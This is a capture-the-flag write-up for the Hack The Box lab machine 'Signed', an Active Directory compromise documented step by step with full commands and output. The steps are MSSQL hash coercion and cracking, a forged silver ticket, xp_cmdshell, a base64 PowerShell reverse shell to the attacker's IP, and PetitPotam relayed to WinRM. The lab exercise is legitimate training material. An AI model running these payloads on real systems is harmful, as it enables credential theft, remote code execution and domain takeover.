---
title: HackTheBox - Signed
date: 2026-02-07
author: 0xkujen
categories: [HackTheBox]
tags: [MSSQL, Silver Ticket, NTLMv2, PetitPotam, NTLM Relay, Kerberos, Active Directory]
---

Signed is a hard-difficulty machine from Hack The Box that starts with an exposed MSSQL service where we use provided credentials to authenticate as `scott`, then coerce the MSSQL service account to authenticate to our SMB server via `xp_dirtree` and capture an NTLMv2 hash for `mssqlsvc` => crack it => enumerate impersonation privileges and logins revealing a silver ticket path => forge a silver ticket with Domain Admins group membership to gain `sysadmin` on MSSQL => enable `xp_cmdshell` for code execution => pivot through Ligolo-ng to access the DC locally => abuse PetitPotam coercion with a custom DNS record to relay the DC machine account's NTLM authentication to WinRM and obtain a shell as `DC01$`.

## [](#Reconnaissance "Reconnaissance")Reconnaissance

Starting with a port scan, we only see MSSQL on port 1433:

```
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RC0+
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2025-10-15T03:36:38+00:00; 0s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-14T23:13:27
|_Not valid after:  2055-10-14T23:13:27
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## [](#MSSQL "MSSQL")MSSQL - 10.129.193.36:1433

We can connect to the MSSQL instance using the credentials `scott:Sm230#C5NatH`:

```
$ mssqlclient.py 'signed.thb/scott:'Sm230#C5NatH'@10.129.193.36'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (scott  guest@master)>
```

We land as a `guest` user. To escalate, we can use `xp_dirtree` to coerce the MSSQL service account into authenticating to our SMB server and capture its NTLMv2 hash with `Responder`:

```
SQL (scott  guest@master)> xp_dirtree \\10.10.16.7\kujen
subdirectory   depth   file
------------   -----   ----
SQL (scott  guest@master)>
```

And we catch the hash:

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.193.36
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:cbcb5744add5552d:F0DB25B201809C8018AFA09C93991F6D:010100000000000000CE6097643DDC0124F58E299CB60F040000000002000800520036005500530001001E00570049004E002D0059005500320043004D0036004900460034004C005A0004003400570049004E002D0059005500320043004D0036004900460034004C005A002E0052003600550053002E004C004F00430041004C000300140052003600550053002E004C004F00430041004C000500140052003600550053002E004C004F00430041004C000700080000CE6097643DDC0106000400020000000800300030000000000000000000000000300000C3BE22B065B37085B753D2A5AC12352F03F8688FD6FFEC9FC4AF56DEDD3E3B1B0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0037000000000000000000
```

Cracking the hash with `john`:

```
$john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)
1g 0:00:00:02 DONE (2025-10-14 23:47) 0.4524g/s 2030Kp/s 2030Kc/s 2030KC/s purcitititya..puppuh
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

We can now re-authenticate to MSSQL as `mssqlsvc` with Windows authentication:

```
$ impacket-mssqlclient 'mssqlsvc:purPLE9795!@'@10.129.193.36 -windows-auth
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  guest@master)>
```

### [](#Enumeration "Enumeration")Enumeration & Silver Ticket

Still a `guest` though. Let's enumerate what we can do:

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_users
UserName                            RoleName   LoginName                           DefDBName   DefSchemaName       UserID                                                                   SID
---------------------------------   --------   ---------------------------------   ---------   -------------   ----------   -------------------------------------------------------------------
##MS_AgentSigningCertificate##      public     ##MS_AgentSigningCertificate##      master      NULL            b'6         '   b'010600000000000901000000fb1b6ce60eda55e1d3dde93b99db322bfc435563'

##MS_PolicyEventProcessingLogin##   public     ##MS_PolicyEventProcessingLogin##   master      dbo             b'5         '                                   b'56f12609fb4eb548906b5a62effb1840'

dbo                                 db_owner   sa                                  master      dbo             b'1         '                                                                 b'01'

guest                               public     NULL                                NULL        guest           b'2         '                                                                 b'00'

INFORMATION_SCHEMA                  public     NULL                                NULL        NULL            b'3         '                                                                  NULL

sys                                 public     NULL                                NULL        NULL            b'4         '                                                                  NULL
```

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_impersonate
execute as   database   permission_name   state_desc   grantee    grantor
----------   --------   ---------------   ----------   --------   ----------------------------
b'USER'      msdb       IMPERSONATE       GRANT        dc_admin   MS_DataCollectorInternalUser
```

We can impersonate `dc_admin` in the `msdb` database. Checking logins, we also see that `SIGNED\IT` is a `sysadmin`:

```
SQL (SIGNED\mssqlsvc  guest@master)> enum_logins
name                                type_desc       is_disabled   sysadmin   securityadmin   serveradmin   setupadmin   processadmin   diskadmin   dbcreator   bulkadmin
---------------------------------   -------------   -----------   --------   -------------   -----------   ----------   ------------   ---------   ---------   ---------
sa                                  SQL_LOGIN                 0          1               0             0            0              0           0           0           0

##MS_PolicyEventProcessingLogin##   SQL_LOGIN                 1          0               0             0            0              0           0           0           0

##MS_PolicyTsqlExecutionLogin##     SQL_LOGIN                 1          0               0             0            0              0           0           0           0

SIGNED\IT                           WINDOWS_GROUP             0          1               0             0            0              0           0           0           0

NT SERVICE\SQLWriter                WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT SERVICE\Winmgmt                  WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT SERVICE\MSSQLSERVER              WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT AUTHORITY\SYSTEM                 WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0

NT SERVICE\SQLSERVERAGENT           WINDOWS_LOGIN             0          1               0             0            0              0           0           0           0

NT SERVICE\SQLTELEMETRY             WINDOWS_LOGIN             0          0               0             0            0              0           0           0           0

scott                               SQL_LOGIN                 0          0               0             0            0              0           0           0           0

SIGNED\Domain Users                 WINDOWS_GROUP             0          0               0             0            0              0           0           0           0

SQL (SIGNED\mssqlsvc  guest@master)>
```

Since we own the `mssqlsvc` service account password, we can forge a **Silver Ticket** and inject ourselves into the `Domain Admins` group (which is part of `SIGNED\IT`). First, we grab the Domain Admins SID:

```
SQL (SIGNED\mssqlsvc  guest@master)> select SUSER_SID('SIGNED\Domain Admins')

-----------------------------------------------------------
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca400020000'

SQL (SIGNED\mssqlsvc  guest@master)>
```

Converting the raw bytes to a SID:

```powershell
PS C:\Users\0xkujen> $sidBytes = [byte[]] (0x01,0x05,0x00,0x00,0x00,0x00,0x00,0x05,0x15,0x00,0x00,0x00,0x5b,0x7b,0xb0,0xf3,0x98,0xaa,0x22,0x45,0xad,0x4a,0x1c,0xa4,0x00,0x02,0x00,0x00)
PS C:\Users\0xkujen> $sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
PS C:\Users\0xkujen> $sid.Value
S-1-5-21-4088429403-1159899800-2753317549-512
```

Now we compute the NT hash of `mssqlsvc`'s password and forge the ticket:

```
$ pypykatz crypto nt 'purPLE9795!@'
ef699384c3285c54128a3ee1ddb1a0cc

```

```
$ impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn pwn/dc01.signed.htb  -groups 512,519,1105 -user-id 1103 mssqlsvc
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```

Using the forged ticket to connect — **make sure to use the FQDN**:

```
$ KRB5CCNAME=mssqlsvc.ccache impacket-mssqlclient -k dc01.signed.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (160 3232)
[!] Press help for extra shell commands
SQL (SIGNED\mssqlsvc  dbo@master)>
```

And we are now `dbo` — confirming sysadmin:

```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin') as sysadmin_check;
sysadmin_check
--------------
             1

SQL (SIGNED\mssqlsvc  dbo@master)>
```

We enable `xp_cmdshell` and get code execution:

```
SQL (SIGNED\mssqlsvc  dbo@master)> EXECUTE sp_configure 'show advanced options', 1;
INFO(DC01): Line 196: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXECUTE sp_configure 'xp_cmdshell', 1;
INFO(DC01): Line 196: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (SIGNED\mssqlsvc  dbo@master)> RECONFIGURE;
SQL (SIGNED\mssqlsvc  dbo@master)> EXECUTE xp_cmdshell 'whoami';
output
---------------
signed\mssqlsvc

NULL

SQL (SIGNED\mssqlsvc  dbo@master)>
```

We can read the root flag directly via `OPENROWSET`:

```
SQL (SIGNED\mssqlsvc  dbo@master)> SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
BulkColumn
---------------------------------------
b'89c9a2dd2a4f8116fcb00e266ec549fd\r\n'

SQL (SIGNED\mssqlsvc  dbo@master)>
```

And get a proper reverse shell with a base64-encoded PowerShell payload:

```
SQL (SIGNED\mssqlsvc  dbo@master)> EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4ANwAiACwAOQAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=';
```

```
$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.193.36] 50844

PS C:\Windows\system32> whoami
signed\mssqlsvc
PS C:\Windows\system32>
```

## [](#PrivEsc "Privilege Escalation")Privilege Escalation

To escalate to `Administrator`, we need to pivot through the DC. We upload and run [Ligolo-ng](https://github.com/nicocha30/ligolo-ng) on the target to create a tunnel back to our machine:

```
PS C:\users\mssqlsvc\desktop> ./agent.exe  -connect 10.10.16.7:11601 -ignore-cert
```

```
$ sudo ./proxy -selfcert -laddr 0.0.0.0:11601
INFO[0000] Loading configuration file ligolo-ng.yaml
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!
INFO[0000] Listening on 0.0.0.0:11601
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8080
WARN[0000] Ligolo-ng API is experimental, and should be running behind a reverse-proxy if publicly exposed.
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!
  Version: 0.8.2

ligolo-ng » interface_listINFO[0004] Agent joined.                                 id=005056b0daca name="SIGNED\\mssqlsvc@DC01" remote="10.129.193.194:65100"
ligolo-ng » interface_list
┌─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
│ Interface list                                                                                                              │
├───┬──────────────┬─────────────────────────────────────────────────────────────────────────────────────┬────────────────────┤
│ # │ TAP NAME     │ DST ROUTES                                                                          │ STATE              │
├───┼──────────────┼─────────────────────────────────────────────────────────────────────────────────────┼────────────────────┤
│ 0 │ tun0         │ 10.10.10.0/23,10.10.16.0/23,10.129.0.0/16,dead:beef::/64,dead:beef:4::/64,fe80::/64 │ Active - 6 routes  │
│ 1 │ ligolosample │ 10.254.0.0/24,10.255.0.0/24                                                         │ Pending - 2 routes │
│ 2 │ ligolo       │ 10.129.0.0/16,240.0.0.1/32,fe80::/64                                                │ Active - 3 routes  │
│ 3 │ evil-cha     │ 10.129.0.0/16                                                                       │ Pending - 1 routes │
└───┴──────────────┴─────────────────────────────────────────────────────────────────────────────────────┴────────────────────┘
Interfaces and routes with "Pending" state will be created on tunnel start.
ligolo-ng » session
? Specify a session : 1 - SIGNED\mssqlsvc@DC01 - 10.129.193.194:65100 - 005056b0daca
[Agent : SIGNED\mssqlsvc@DC01] » start
INFO[0010] Starting tunnel to SIGNED\mssqlsvc@DC01 (005056b0daca)
```

We set up `240.0.0.1` as a [local port proxy](https://docs.ligolo.ng/Localhost/) so we can interact with the DC's localhost services. Confirming Kerberos is reachable:

```
$ nmap 240.0.0.1 -p 88 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-15 02:58 EDT
Nmap scan report for 240.0.0.1
Host is up (0.50s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec

Nmap done: 1 IP address (1 host up) scanned in 0.63 seconds
```

Checking for coercion vulnerabilities with `nxc`:

```
$ nxc smb 240.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus
SMB         240.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
SMB         240.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, DFSCoerce
COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PrinterBug
COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, MSEven
```

The DC is vulnerable to **PetitPotam**. The trick here is that we need the DC to authenticate to a hostname that resolves to our attacker IP — so we use `dnstool` to add a DNS record pointing to our machine:

```
┌──(kali㉿kali)-[~]
└─$ dnstool -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' 240.0.0.1 -a add -d 10.10.16.7 -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Confirming it resolves:

```
┌──(kali㉿kali)-[~/Downloads]
└─$ dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @240.0.0.1 +tcp

; <<>> DiG 9.20.9-1-Debian <<>> localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.h
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32782
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. IN A

;; ANSWER SECTION:
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. 180 IN A 240.0.0.1

;; Query time: 480 msec
;; SERVER: 240.0.0.1#53(240.0.0.1) (TCP)
;; WHEN: Wed Oct 15 02:55:42 EDT 2025
;; MSG SIZE  rcvd: 109
```

Now we set up `ntlmrelayx` to relay the incoming authentication to WinRM on the DC:

```
┌──(kali㉿kali)-[~/Downloads/impacket/examples]
└─$ python3 ntlmrelayx.py -smb2support -t winrms://240.0.0.1 -i -debug
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /home/kali/Downloads/impacket/impacket
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client WINRMS loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client DCSYNC loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack WINRMS loaded..
[+] Protocol Attack MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Setting up WinRM (HTTP) Server on port 5985
[*] Setting up WinRMS (HTTPS) Server on port 5986
[*] Setting up RPC Server on port 135
[*] Multirelay disabled

[*] Servers started, waiting for connections
```

And trigger PetitPotam through our custom DNS name:

```
┌──(kali㉿kali)-[~]
└─$ nxc smb 240.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o METHOD=Petitpotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
SMB         240.0.0.1       445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:SIGNED.HTB) (signing:True) (SMBv1:False)
SMB         240.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
COERCE_PLUS 240.0.0.1       445    DC01             VULNERABLE, PetitPotam
COERCE_PLUS 240.0.0.1       445    DC01             Exploit Success, lsarpc\EfsRpcAddUsersToFile
```

The relay succeeds and we get an interactive WinRM shell:

```
[*] (SMB): Received connection from 10.129.193.194, attacking target winrms://240.0.0.1
[!] The client requested signing, relaying to WinRMS might not work!
[*] HTTP server returned error code 500, this is expected, treating as a successful login
[*] (SMB): Authenticating connection from /@10.129.193.194 against winrms://240.0.0.1 SUCCEED [1]
[*] winrms:///@240.0.0.1 [1] -> Started interactive WinRMS shell via TCP on 127.0.0.1:11000
[*] All targets processed!
[*] (SMB): Connection from 10.129.193.194 controlled, but there are no more targets left!
```

Connecting to it:

```
$ nc 127.0.0.1 11000
Type help for list of commands

# cd
C:\Windows\system32\config\systemprofile

# powershell -c cat c:/users/administrator/desktop/root.txt
1ebf8220ce4aa7a815c26c7623e6b8fd
```

And that was it for Signed, hope you learned something new!

-0xkujen
